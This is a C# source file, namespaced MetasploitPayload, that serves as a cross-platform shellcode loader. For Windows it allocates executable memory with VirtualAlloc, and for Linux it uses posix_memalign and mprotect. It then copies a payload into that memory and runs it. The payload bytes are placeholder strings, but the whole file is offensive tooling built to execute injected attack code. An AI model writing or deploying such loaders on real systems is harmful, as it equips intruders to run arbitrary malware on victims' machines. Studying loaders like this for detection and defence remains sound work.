using System;
using System.Runtime.InteropServices;

namespace MetasploitPayload
{
     class WindowsProgram
     {
          [DllImport("kernel32")]
          static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

          [UnmanagedFunctionPointer(CallingConvention.StdCall)]
          delegate void WindowsRun();

          static void Main(string[] args)
          {
               OperatingSystem os = Environment.OSVersion;
               bool x86 = (IntPtr.Size == 4);
               byte[] payload;

               if (os.Platform == PlatformID.Win32NT)
               {
                    if (!x86)
                         payload = System.Text.Encoding.Default.GetBytes("x86-64 payload here");
                    else
                         payload = System.Text.Encoding.Default.GetBytes("x86 payload here");

                    IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
                    Marshal.Copy(payload, 0, ptr, payload.Length);
                    WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
                    r();
               }
          }
     }
     class LinuxProgram
     {
          [DllImport("libc")]
          static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);

          [DllImport("libc")]
          static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr size);

          [DllImport("libc")]
          static extern void free(IntPtr ptr);

          [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
          delegate void LinuxRun();

          static void Main(string[] args)
          {
               OperatingSystem os = Environment.OSVersion;
               bool x86 = (IntPtr.Size == 4);
               byte[] payload;

               if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128)
               {
                    if (!x86)
                         payload = System.Text.Encoding.Default.GetBytes("x86-64 linux payload here");
                    else
                         payload = System.Text.Encoding.Default.GetBytes("x86 linux payload here");

                    IntPtr ptr = IntPtr.Zero;
                    IntPtr success = IntPtr.Zero;
                    bool freeMe = false;

                    try
                    {
                         int pagesize = 4096;
                         IntPtr length = (IntPtr)payload.Length;
                         success = posix_memalign(ref ptr, (IntPtr)32, length);
                         if (success != IntPtr.Zero)
                         {
                              Console.WriteLine("memalign failed: "+success);
                              return;
                         }
                         freeMe = true;
                         IntPtr alignedPtr = (IntPtr)((int)ptr& ~(pagesize - 1));
                         IntPtr mode = (IntPtr)(0x04 | 0x02 | 0x01);
                         success = mprotect(alignedPtr, (IntPtr)32, mode);
                         if (success != IntPtr.Zero)
                         {
                              Console.WriteLine("mprotect failed");
                              return;
                         }

                         Marshal.Copy(payload, 0, ptr, payload.Length);
                         LinuxRun r = (LinuxRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(LinuxRun));
                         r();
                    }
                    finally
                    {
                         if (freeMe)
                              free(ptr);
                    }
               }
          }
     }
}
